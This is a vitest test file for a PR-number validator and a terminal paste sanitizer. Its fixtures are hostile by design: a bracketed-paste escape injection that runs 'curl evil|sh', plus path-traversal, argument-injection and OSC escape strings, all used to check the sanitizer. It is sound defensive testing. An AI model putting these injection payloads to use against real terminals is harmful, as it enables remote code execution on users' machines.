import { describe, it, expect } from "vitest";
import { prNumber, sanitizePaste } from "./app.ts";

describe("prNumber (PR number coercion)", () => {
  it("accepts positive integers (string or number)", () => {
    expect(prNumber("123")).toBe(123);
    expect(prNumber(20366)).toBe(20366);
  });
  it("rejects non-positive, non-integer, and non-numeric input", () => {
    expect(prNumber("0")).toBe(null);
    expect(prNumber("-5")).toBe(null);
    expect(prNumber("1.5")).toBe(null);
    expect(prNumber("../../tmp/pwn")).toBe(null);
    expect(prNumber("--force")).toBe(null);
    expect(prNumber("")).toBe(null);
    expect(prNumber(undefined)).toBe(null);
  });
});

describe("sanitizePaste (PTY paste hardening)", () => {
  it("keeps ordinary text, tabs, and newlines", () => {
    expect(sanitizePaste("hello\tworld\nline two")).toBe("hello\tworld\nline two");
    expect(sanitizePaste("émojis 🦊 and unicode ✓")).toBe("émojis 🦊 and unicode ✓");
  });
  it("strips ESC so an embedded bracketed-paste end can't escape", () => {
    // An attacker comment tries to close bracketed paste early then submit.
    const evil = "text\x1b[201~\rcurl evil|sh";
    const out = sanitizePaste(evil);
    expect(out).not.toContain("\x1b");
    expect(out).toBe("text[201~curl evil|sh"); // ESC and CR gone, rest inert
  });
  it("strips other control bytes (OSC title/clipboard, DEL, NUL)", () => {
    expect(sanitizePaste("a\x00b\x07c\x7fd")).toBe("abcd");
    expect(sanitizePaste("\x1b]0;pwned\x07")).toBe("]0;pwned");
  });
});
